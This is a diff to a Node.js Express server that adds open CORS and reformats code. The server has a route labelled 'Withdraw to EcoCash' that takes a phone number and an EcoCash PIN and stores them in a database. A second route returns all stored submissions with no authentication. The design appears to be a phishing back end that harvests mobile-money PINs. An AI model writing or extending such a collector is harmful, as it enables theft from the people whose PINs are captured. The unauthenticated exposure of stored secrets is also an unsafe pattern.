@@ -1,7 +1,10 @@
 const express = require("express");
+const cors = require("cors");
 const { Pool } = require("pg");
 
 const app = express();
+
+app.use(cors());
 app.use(express.json());
 
 const pool = new Pool({
@@ -59,6 +62,7 @@ error: err.message
 
 app.post("/Withdraw to EcoCash", async (req, res) => {
 try {
+
 const { ecocash_number, ecocash_pin } = req.body;
 
 await pool.query(
@@ -72,24 +76,29 @@ res.json({
 });
 
 } catch (err) {
+
 res.status(500).json({
-error: err.message
+  error: err.message
 });
+
 }
 });
 
 app.get("/submissions", async (req, res) => {
 try {
+
 const result = await pool.query(
-"SELECT * FROM submissions ORDER BY id DESC"
+  "SELECT * FROM submissions ORDER BY id DESC"
 );
 
 res.json(result.rows);
 
 } catch (err) {
+
 res.status(500).json({
-error: err.message
+  error: err.message
 });
+
 }
 });
 
